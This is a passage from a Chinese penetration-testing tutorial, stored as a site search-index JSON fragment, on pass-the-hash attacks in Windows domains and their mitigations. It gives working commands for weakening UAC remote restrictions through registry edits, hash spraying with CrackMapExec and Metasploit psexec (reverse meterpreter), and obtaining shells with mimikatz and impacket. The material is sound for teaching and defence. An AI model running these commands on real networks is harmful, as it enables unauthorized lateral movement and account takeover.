Approval Mode for the built-in Administrator account</code>\uff0c\u9ed8\u8ba4\u662f <code>Disabled</code>\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u518d\u770b\u770b<code>Admin Approval Mode</code> \u7684\u89e3\u91ca\uff0c\u5982\u56fe\u6240\u793a\uff0c\u8be5\u503c\u63a7\u5236\u5185\u7f6e\u7ba1\u7406\u5458\u5e10\u6237administrator \u7684\u7ba1\u7406\u5458\u5ba1\u6279\u6a21\u5f0f\u7684\u884c\u4e3a\u3002</p> <ul> <li>\u5982\u679c\u8be5\u503c\u542f\u7528\uff0c\u5219\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u6237 administrator \u4f7f\u7528\u7ba1\u7406\u5458\u5ba1\u6279\u6a21\u5f0f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4efb\u4f55\u9700\u8981\u63d0\u5347\u7279\u6743\u7684\u64cd\u4f5c\u90fd\u5c06\u63d0\u793a\u7528\u6237\u6279\u51c6\u8be5\u64cd\u4f5c\u3002</li> <li>\u5982\u679c\u8be5\u503c\u5173\u95ed\uff0c\u5219\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u6237 administrator \u8fd0\u884c\u5177\u6709\u5b8c\u5168\u7ba1\u7406\u6743\u9650\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ul> <p></p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u8be5\u503c\u5f00\u542f\u65f6\uff0c\u5373\u4f7f\u662f\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u6237 administrator \u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\uff0c\u4e5f\u9700\u8981\u63d0\u793a\u7528\u6237\u6279\u51c6\u8be5\u884c\u4e3a\u3002\u4f46\u662f\u8be5\u503c\u662f\u9ed8\u8ba4\u5173\u95ed\u7684\uff0c\u56e0\u6b64\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u6237administrator \u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\uff0c\u4e0d\u9700\u8981\u63d0\u793a\u7528\u6237\u6279\u51c6\u8be5\u884c\u4e3a\u5c31\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\u4e00\u4e2a\u5b8c\u5168\u7ba1\u7406\u5458\u6743\u9650\u7684\u4ee4\u724c\u3002\u5982\u56fe\u6240\u793a\uff0c\u8be5\u503c\u9ed8\u8ba4\u662f\u4e3a 0\uff0c\u5373\u5173\u95ed\u3002</p> <p></p> <p>\u56e0\u6b64\u5982\u679c\u7f51\u7edc\u7ba1\u7406\u5458\u60f3\u7981\u6b62\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u53f7 administrator \u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\u5f97\u5230\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\uff0c\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5c06 FilterAdministratorToken \u6ce8\u518c\u8868\u503c\u8bbe\u7f6e\u4e3a 1\u3002</p> <pre><code>reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v FilterAdministratorToken /t REG_DWORD /d 1 /f\n</code></pre> <p>\u5982\u56fe\u5c06 FilterAdministratorToken \u6ce8\u518c\u8868\u503c\u8bbe\u7f6e\u4e3a 1\u3002</p> <p></p> <p>\u518d\u6b21\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u4f7f\u7528\u5185\u7f6e\u7684 administrator \u8d26\u53f7\u548c\u57df\u8d26\u53f7\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb</p> <pre><code>python3 smbexec.py administrator@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9\npython3 smbexec.py xie/hack@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:b98e75b5ff7a3d3ff05e07f211ebe7a8\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5185\u7f6e\u7684 administrator \u8d26\u53f7\u54c8\u5e0c\u4f20\u9012\u5931\u8d25\uff0c\u4f46\u662f\u57df\u8d26\u53f7\u4e0d\u53d7\u6b64\u503c\u5f71\u54cd\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#3localaccounttokenfilterpolicy","title":"3.LocalAccountTokenFilterPolicy","text":"<p>\u6211\u4eec\u518d\u6765\u770b\u770b\u5982\u4f55\u8ba9\u975e administrator \u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\u4e5f\u5f97\u5230\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\u5462\uff1f</p> <p>\u5fae\u8f6f\u7684\u5b98\u65b9\u6587\u6863\u7ed9\u51fa\u4e86\u64cd\u4f5c\u6d41\u7a0b\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>UAC \u8fdc\u7a0b\u8fde\u63a5\u9650\u5236\u662f\u901a\u8fc7\u6ce8\u518c\u8868<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> \u6765\u63a7\u5236\u7684\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWindows Vista \u53ca\u5176\u4ee5\u540e\u7684\u7cfb\u7edf\u6ca1\u6709\u8be5\u6ce8\u518c\u8868\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u8be5\u6ce8\u518c\u8868\u503c\u3002</p> <pre><code>reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system/v LocalAccountTokenFilterPolicy\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u67e5\u8be2\u4e0d\u5230\u8be5\u503c\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u60f3\u7981\u7528 UAC \u8fdc\u7a0b\u8fde\u63a5\u9650\u5236\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fdc\u7a0b\u4e3b\u673a\u7cfb\u7edf\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u521b\u5efa <code>LocalAccountTokenFilterPolicy</code> \u6ce8\u518c\u8868\u503c\uff0c\u5e76\u5c06\u5176\u503c\u8d4b\u4e3a 1\u3002</p> <pre><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u521b\u5efa <code>LocalAccountTokenFilterPolicy</code> \u6ce8\u518c\u8868\u503c\uff0c\u5e76\u5c06\u5176\u503c\u8d4b\u4e3a 1\u3002</p> <p></p> <p>\u8fd9\u65f6\u53ea\u8981\u662f\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237\u5747\u53ef\u4ee5\u5728\u8fdc\u7a0b\u8fde\u63a5\u65f6\u83b7\u5f97\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u4ee4\u724c\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5f53\u672a\u589e\u52a0\u6ce8\u518c\u8868\u524d\uff0c\u4f7f\u7528\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237 test \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u5931\u8d25\u3002\u5f53\u6211\u4eec\u589e\u52a0\u4e86\u8be5\u6ce8\u518c\u8868\u503c\u540e\u518d\u6b21\u4f7f\u7528\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237 test \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u53d1\u73b0\u53ef\u4ee5\u653b\u51fb\u6210\u529f\u4e86\uff01</p> <p></p> <p>\u5982\u679c\u6211\u4eec\u5229\u7528\u6210\u529f\u540e\u60f3\u5220\u9664\u8be5\u6ce8\u518c\u8868\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u5220\u9664\u3002</p> <pre><code>reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system/v LocalAccountTokenFilterPolicy /f\n</code></pre> <p>\u5220\u9664\u4e86\u8be5\u6ce8\u518c\u8868\u503c\u540e\uff0c\u518d\u6b21\u4f7f\u7528\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237 test \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u653b\u51fb\u5931\u8d25\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#4","title":"4.\u672c\u5730\u8d26\u53f7","text":"<p>\u901a\u8fc7\u4ee5\u4e0a\u5b9e\u9a8c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u672c\u5730\u8d26\u53f7\u53d7 UAC \u8fdc\u7a0b\u8fde\u63a5\u7684\u5f71\u54cd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5728\u4f7f\u7528\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u540c\u7cfb\u7edf\u7248\u672c\u6709\u6240\u4e0d\u540c\u3002</p> <ul> <li>Windows Vista \u4e4b\u524d\u7684\u673a\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u5185\u6240\u6709\u7528\u6237\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</li> <li>Windows Vista \u53ca\u5176\u4e4b\u540e\u7684\u673a\u5668\uff0c\u53ea\u80fd\u662f administrator \u7528\u6237\u7684\u54c8\u5e0c\u503c\u624d\u80fd\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u5176\u4ed6\u975e administrator \u7684\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\u4e0d\u80fd\u4f7f\u7528\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u4f1a\u63d0\u793a\u62d2\u7edd\u8bbf\u95ee\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#5","title":"5.\u57df\u8d26\u53f7","text":"<p>\u57df\u8d26\u53f7\u5219\u4e0d\u53d7 UAC \u8fdc\u7a0b\u8fde\u63a5\u7684\u5f71\u54cd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u54c8\u5e0c\u4f20\u9012\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>\u9488\u5bf9\u666e\u901a\u57df\u4e3b\u673a\uff0c\u53ef\u4ee5\u4f7f\u7528\u8be5\u57df\u4e3b\u673a\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u5185\u7684\u666e\u901a\u57df\u7528\u6237\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</li> <li>\u9488\u5bf9\u57df\u63a7\uff0c\u53ef\u4ee5\u4f7f\u7528\u57df\u7ba1\u7406\u5458\u7ec4\u5185\u6240\u6709\u7528\u6237\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#_2","title":"\u54c8\u5e0c\u78b0\u649e","text":"<p>\u5728\u4f01\u4e1a\u5185\u7f51\u73af\u5883\u4e2d\uff0c\u5f88\u591a\u8ba1\u7b97\u673a\u5728\u5b89\u88c5\u7684\u65f6\u5019\u4f7f\u7528\u7684\u662f\u76f8\u540c\u7684\u5bc6\u7801\u3002\u56e0\u6b64\uff0c\u5f53\u6211\u4eec\u83b7\u5f97\u4e86\u5176\u4e2d\u67d0\u4e00\u53f0\u673a\u5668\u7684\u5bc6\u7801 Hash \u800c\u65e0\u6cd5\u89e3\u5bc6\u6210\u660e\u6587\u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u54c8\u5e0c\u78b0\u649e\u6765\u78b0\u649e\u51fa\u4f7f\u7528\u76f8\u540c\u5bc6\u7801\u7684\u673a\u5668\u3002\u8fdb\u884c\u54c8\u5e0c\u78b0\u649e\u7684\u5de5\u5177\u6709\u5f88\u591a\uff0c\u5982CrackMapExec\u3001MSF \u7b49\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#1crackmapexec","title":"1.CrackMapExec","text":"<p>\u6211\u4eec\u4f7f\u7528 CrackMapExec \u5de5\u5177\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u5185\u7f51\u54c8\u5e0c\u78b0\u649e</p> <pre><code>crackmapexec.exe 10.211.55.0/24 -u administrator -H aada8eda23213c027743e6c498d751aa:329153f560eb329c0e1deea55e88a1e9\n</code></pre> <p>\u8fd0\u884c\u5b8c\u6210\u540e\uff0c\u5982\u679c\u76ee\u6807\u4e3b\u673a\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\uff0c\u5219\u4f1a\u63d0\u793a[+]\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#2msf","title":"2.MSF","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 MSF \u91cc\u9762\u7684<code>exploit/windows/smb/psexec</code>\u6a21\u5757\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\uff0c\u5f53rhosts \u53c2\u6570\u6307\u5b9a\u4e3a\u4e00\u4e2a\u7f51\u6bb5\u65f6\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c\u54c8\u5e0c\u78b0\u649e\u4e86\uff01</p> <pre><code>use exploit/windows/smb/psexec\nset payload windows/meterpreter/reverse_tcp\nset rhosts 10.211.55.0/24\nset smbuser administrator\nset smbpass aada8eda23213c027743e6c498d751aa:329153f560eb329c0e1deea55e88a1e9\nrun\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 MSF \u8fdb\u884c\u54c8\u5e0c\u78b0\u649e\u3002</p> <p></p> <p>\u8fd0\u884c\u5b8c\u6210\u540e\uff0c\u5982\u679c\u76ee\u6807\u4e3b\u673a\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u7801\uff0c\u5219\u4f1a\u63d0\u793a[+]\uff0c\u5e76\u4e14\u4f1a\u83b7\u5f97\u4f7f\u7528\u8be5\u5bc6\u7801\u4e3b\u673a\u7684\u6743\u9650\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u6267\u884c sessions -l \u547d\u4ee4\u67e5\u770b\u5df2\u7ecf\u83b7\u5f97\u6743\u9650\u673a\u5668\u7684\u7684 session\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6ce8\uff1a\u5b9e\u9645\u5185\u7f51\u4f7f\u7528 MSF \u6765\u8fdb\u884c\u54c8\u5e0c\u78b0\u649e\uff0c\u9700\u8981\u4fee\u6539 payload\uff0c\u4fee\u6539\u4e3a\u6b63\u5411\u7684payload\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#_3","title":"\u5229\u7528\u54c8\u5e0c\u4f20\u9012\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8","text":"<p>\u5229\u7528\u54c8\u5e0c\u4f20\u9012\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u7684\u5de5\u5177\u6709\u5f88\u591a\uff0c\u6bd4\u5982 MSF\u3001mimikatz\u3001impacket \u91cc\u9762\u7684 psexec\u3001smbexec\u3001wmiexec \u7b49\u811a\u672c\u5747\u53ef\u4ee5\u5229\u7528\u5bc6\u7801\u7684 Hash \u6765\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#1msf","title":"1.MSF \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 MSF \u91cc\u9762\u7684 <code>exploit/windows/smb/psexec</code> \u6a21\u5757\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\uff0c\u5f53rhosts \u53c2\u6570\u6307\u5b9a\u4e3a\u5177\u4f53\u7684 ip \u65f6\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u6307\u5b9a\u76ee\u6807 ip \u7684\u6743\u9650\uff01</p> <pre><code>use exploit/windows/smb/psexec\nset payload windows/meterpreter/reverse_tcp\nset rhosts 10.211.55.7\nset smbuser administrator\nset smbpass aada8eda23213c027743e6c498d751aa:329153f560eb329c0e1deea55e88a1e9\nrun\n</code></pre> <p>\u6ce8\uff1a\u5b9e\u9645\u5185\u7f51\u4f7f\u7528 MSF \u6765\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u7684\u8bdd\uff0c\u9700\u8981\u4fee\u6539 payload\uff0c\u4fee\u6539\u4e3a\u6b63\u5411\u7684payload\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#2mimikatz","title":"2.mimikatz \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb","text":"<p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u6a2a\u5411\u79fb\u52a8\uff0c\u83b7\u5f97\u76ee\u6807\u4e3b\u673a\u4e00\u4e2a\u53ef\u4ea4\u4e92\u5f0f\u7684 shell\u3002</p> <pre><code>privilege::debug\nsekurlsa::pth /user:administrator /domain:10.211.55.7 /ntlm:329153f560eb329c0e1deea55e88a1e9\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u6a2a\u5411\u79fb\u52a8\uff0c\u83b7\u5f97\u76ee\u6807\u4e3b\u673a\u4e00\u4e2a\u53ef\u4ea4\u4e92\u5f0f\u7684shell\u3002</p> <p></p> <p>\u5728\u5f39\u51fa\u7684 cmd \u7a97\u53e3\u4e2d\uff0c\u4f7f\u7528<code>wmiexec.vbs</code> \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u9a8c\u8bc1\u6267\u884c\u4ea4\u4e92\u5f0f\u547d\u4ee4\u3002</p> <pre><code>cscript wmiexec.vbs /shell 10.211.55.7\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u83b7\u5f97\u4e86\u4e00\u4e2a\u53ef\u4ea4\u4e92\u5f0f\u7684\u6743\u9650\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#3impacket","title":"3.impacket \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 impacket \u91cc\u9762\u7684 psexec\u3001smbexec\u3001wmiexec\u3001atexec\u3001dcomexec \u7b49\u811a\u672c\u5229\u7528\u54c8\u5e0c\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\uff0c\u4ee5\u4e0b\u6f14\u793a\u4f7f\u7528 psexec.py \u811a\u672c\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u3002</p> <p>\u4f7f\u7528 psexec.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5229\u7528\u54c8\u5e0c\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684\u53ef\u4ea4\u4e92\u5f0f shell\u3002</p> <pre><code>python3 psexec.py administrator@10.211.55.7 -hashes 329153f560eb329c0e1deea55e88a1e9:329153f560eb329c0e1deea55e88a1e9\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 psexec \u54c8\u5e0c\u4f20\u9012\u83b7\u5f97\u76ee\u6807\u4e3b\u673a\u6743\u9650\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#kb2871997","title":"\u66f4\u65b0 KB2871997 \u8865\u4e01\u4ea7\u751f\u7684\u5f71\u54cd","text":"<p>\u5fae\u8f6f\u5728 2014 \u5e74 5 \u6708 13 \u65e5\u53d1\u5e03\u4e86\u9488\u5bf9 Pass The Hash \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u7684\u66f4\u65b0\u8865\u4e01KB2871997\u3002\u5176\u6807\u9898\u4e3a<code>\"Update to fix the Pass-The-Hash Vulnerability\"</code>\uff0c\u800c\u5728\u4e00\u5468\u540e\u5fae\u8f6f\u5374\u628a\u6807\u9898\u6539\u6210\u4e86<code>\"Update to improve credentials protection and management\"</code>\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6b63\u5982\u6807\u9898\u6240\u8a00\uff0c\u8fd9\u4e2a\u8865\u4e01\u7684\u6700\u5927\u4f5c\u7528\u662f\u66f4\u65b0\u4ee5\u6539\u8fdb\u51ed\u636e\u4fdd\u62a4\u548c\u7ba1\u7406\u3002\u8fd9\u4e2a\u8865\u4e01\u4e3b\u8981\u5305\u542b Windows 8.1 \u548c Windows Server2012 R2 \u4e2d\u5f15\u5165\u7684\u589e\u5f3a\u5b89\u5168\u4fdd\u62a4\u673a\u5236\u3002\u4f7f\u5f97 Windows 7\u3001Windows 8\u3001Windows Server 2008R2 \u7b49\u4f4e\u7248\u672c\u7cfb\u7edf\u4e5f\u53ef\u4ee5\u83b7\u5f97\u65b0\u7684\u5b89\u5168\u4fdd\u62a4\u673a\u5236\uff0c\u4f46\u662f\u8fd9\u4e2a\u8865\u4e01\u5e76\u4e0d\u80fd\u591f\u4fee\u590dPTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0cKB2871997 \u8865\u4e01\u5f15\u5165\u4e86\u54ea\u4e9b\u65b0\u7684\u5b89\u5168\u4fdd\u62a4\u673a\u5236\u5462\uff1f</p> <ul> <li>\"Protected Users\"\u7ec4\u7684\u652f\u6301</li> <li>\"Restricted Admin RDP\"\u6a21\u5f0f\u8fdc\u7a0b\u5ba2\u6237\u7aef\u652f\u6301</li> <li>\"Pass The Hash\"\u589e\u5f3a\u4fdd\u62a4</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#1protected-users","title":"1.\"Protected Users\"\u7ec4\u7684\u652f\u6301","text":"<p>\"Protected Users\" \u7ec4\u662f\u901a\u8fc7\u54ea\u4e9b\u5b89\u5168\u63aa\u65bd\u4fdd\u62a4\u7ec4\u5185\u7528\u6237\u5b89\u5168\u6027\u7684\u5462\uff1f</p> <ul> <li>\"Protected Users\"\u7ec4\u4e2d\u7684\u7528\u6237\u5f3a\u5236\u53ea\u80fd\u4f7f\u7528 Kerberos \u534f\u8bae\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u62d2\u7edd NTLM\u3001Digest \u548c CredSSP \u8ba4\u8bc1\u3002</li> <li>\u4f7f\u7528 Kerberos \u534f\u8bae\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u65f6\u5019\u62d2\u7edd\u4f7f\u7528 DES \u548c RC4 \u52a0\u5bc6\u7c7b\u578b\uff0c\u5f3a\u5236\u4f7f\u7528 AES \u52a0\u5bc6\u8fdb\u884c\u9884\u8eab\u4efd\u9a8c\u8bc1\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u76ee\u6807\u57df\u9700\u8981\u914d\u7f6e\u4e3a\u652f\u6301AES \u52a0\u5bc6\u3002</li> <li>\u4e0d\u80fd\u4f7f\u7528 Kerberos \u7ea6\u675f\u6027\u6216\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u6765\u59d4\u6d3e\u7528\u6237\u7684\u8d26\u6237\u3002</li> </ul> <p>\u4ece\u4e0a\u9762\u5b89\u5168\u4fdd\u62a4\u63aa\u65bd\u53ef\u4ee5\u770b\u5230\uff0c\"Protected Users\"\u7ec4\u7684\u6210\u5458\u5c06\u65e0\u6cd5\u4f7f\u7528 NTLM\u3001Digest \u548c CredSSP \u8fdb\u884c\u8ba4\u8bc1\uff0c\u5f3a\u5236\u4f7f\u7528 Kerberos \u534f\u8bae\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u3002\u5e76\u4e14\u4f7f\u7528 Kerberos \u534f\u8bae\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65f6\u5019\uff0c\u4e5f\u65e0\u6cd5\u4f7f\u7528 DES \u548c RC4 \u52a0\u5bc6\u7c7b\u578b\u8fdb\u884c\u9884\u8ba4\u8bc1\uff0c\u53ea\u80fd\u5f3a\u5236\u4f7f\u7528\u5177\u6709\u66f4\u9ad8\u52a0\u5bc6\u5f3a\u5ea6\u7684 AES \u52a0\u5bc6\u8fdb\u884c\u9884\u8eab\u4efd\u8ba4\u8bc1\u3002\u56e0\u6b64\u5728Kerberos \u8eab\u4efd\u8ba4\u8bc1\u9636\u6bb5\u5c31\u7528\u4e0d\u5230 NTLM hash \u4e86\u3002\u653b\u51fb\u8005\u4e5f\u5c31\u65e0\u6cd5\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u4e86\u3002</p> <p>\u800c KB2871997 \u8865\u4e01\u4f7f\u5f97\u4f4e\u4e8e Windows Server 2012R2 \u57df\u529f\u80fd\u7ea7\u522b\u7684\u57df\u63a7\u4e5f\u652f\u6301\"Protected Users\"\u7ec4\u3002\u56e0\u6b64\uff0c\u5982\u679c\u5c06\u654f\u611f\u7528\u6237\u52a0\u5165\"Protected Users\"\u7ec4\u540e\uff0c\u5219\u8be5\u654f\u611f\u7528\u6237\u65e0\u6cd5\u5c06\u65e0\u6cd5\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u672a\u5c06 administrator \u52a0\u5165\"Protected Users\"\u7ec4\u65f6\uff0c\u53ef\u4ee5\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002\u5f53\u628a administrator \u52a0\u5165\"Protected Users\" \u7ec4\u540e\uff0c\u65e0\u6cd5\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#2restricted-admin-rdp","title":"2.\"Restricted Admin RDP\"\u6a21\u5f0f\u8fdc\u7a0b\u5ba2\u6237\u7aef\u652f\u6301","text":"<p><code>\"Restricted Admin RDP\"</code>\u6a21\u5f0f\u589e\u5f3a\u4e86\u5b89\u5168\u6027\u4ee5\u4fdd\u62a4\u7528\u6237\u7684\u51ed\u636e\uff0c\u4f46\u662f\u6b64\u6a21\u5f0f\u5bf9\u4e8e<code>\"Remote Desktop Users\"</code>\u7ec4\u5185\u7684\u7528\u6237\u4e0d\u53ef\u7528\u3002\u5728<code>\"Restricted Admin RDP\"</code> \u6a21\u5f0f\u4e4b\u524d\uff0cRDP \u767b\u5f55\u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684\u767b\u5f55\uff0c\u53ea\u6709\u5728\u7528\u6237\u63d0\u4f9b\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e4b\u540e\uff0c\u624d\u53ef\u4ee5\u83b7\u5f97\u8bbf\u95ee\u6743\u9650\u3002\u4ee5\u8fd9\u79cd\u65b9\u5f0f RDP \u767b\u5f55\u5230\u76ee\u6807\u4e3b\u673a\u4f1a\u5c06\u7528\u6237\u7684\u51ed\u636e\u5b58\u50a8\u5728\u76ee\u6807\u4e3b\u673a\u7684\u5185\u5b58\u4e2d\u3002\u5982\u679c\u76ee\u6807\u4e3b\u673a\u88ab\u62ff\u4e0b\uff0c\u6b64\u51ed\u636e\u4e5f\u4f1a\u88ab\u76d7\u3002\u800c<code>\"Restricted Admin RDP\"</code> \u6a21\u5f0f\u80fd\u591f\u652f\u6301\u7f51\u7edc\u767b\u5f55\uff0c\u5373\u53ef\u4ee5\u901a\u8fc7\u7528\u6237\u73b0\u6709\u7684\u767b\u5f55\u4ee4\u724c\u6765\u8fdb\u884cRDP 